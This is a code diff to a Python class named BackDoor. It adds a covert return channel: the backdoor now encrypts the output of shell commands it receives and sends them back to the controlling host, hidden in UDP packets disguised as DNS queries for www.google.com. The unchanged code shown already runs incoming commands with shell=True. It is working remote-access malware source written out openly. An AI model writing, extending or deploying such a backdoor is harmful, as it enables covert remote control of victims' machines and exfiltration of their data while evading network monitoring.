@@ -1,7 +1,9 @@
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.primitives import padding
-from scapy.layers.inet import UDP, IP, IPOption
+from scapy.layers.dns import DNS, DNSQR
+from scapy.layers.inet import UDP, IP
 from scapy.all import sniff, send
+from scapy.volatile import RandShort
 from subprocess import run
 import sys
 
@@ -15,11 +17,36 @@ class BackDoor:
         self.flag_begin = "****["
         self.flag_close = "]****"
         self.port = 53
+        self.client = ""
 
     def start(self):
         print("Starting")
         self.sniff_init()
+    def craft_packet(self, msg: str):
+        ip = IP(dst=self.client)
+        udp = UDP(sport=RandShort(), dport=53)
+        dns = DNS(rd=1, qd=DNSQR(qname="www.google.com"))
+        payload = msg
+        pkt = ip / udp / dns / payload
+        try:
+            print("crafting and sending")
+            send(pkt, verbose=0)
+        except PermissionError:
+            print("Permission error! Run as sudo or admin!")
+            sys.exit()
 
+    def prepare_msg(self, cmd: str) -> str:
+        cipher = self.generate_cipher()
+        encrypted_data = self.encrypt_data(cipher, cmd)
+        # Convert the encrypted string to bytes
+
+        print(f"Encrypted format: {encrypted_data}")
+        hex_str = self.get_hex_string(encrypted_data)
+        print("--------------------------------------------------------------")
+        msg = self.flag_begin + hex_str + self.flag_close
+        print(f"Added flags, sending: {msg}")
+        print("--------------------------------------------------------------")
+        return msg
 
     def sniff_init(self) -> None:
         try:
@@ -38,17 +65,23 @@ class BackDoor:
     def execute(self, cmd: str) -> None:
         output = run(cmd, shell=True, capture_output=True, text=True)
         output = output.stdout
-        print(output)
-
+        msg = self.prepare_msg(output)
+        self.craft_packet(msg)
     def filter_packets(self, packet) -> None:
         try:
             msg = packet[UDP].load.decode()
             if UDP in packet and msg.startswith(self.flag_begin) \
                     and msg.endswith(self.flag_close):
                 print(f"Received authenticated packet: {msg}")
+                if not self.client:
+                    self.set_client(packet[IP].src)
                 self.process_packets(msg)
         except:
             return
+
+    def set_client(self, ip):
+        print(f"Setting ip as {ip}")
+        self.client = ip
 
     def decrypt_data(self, encrypted_msg: str) -> str:
         encrypted_byte_stream = bytes.fromhex(encrypted_msg)
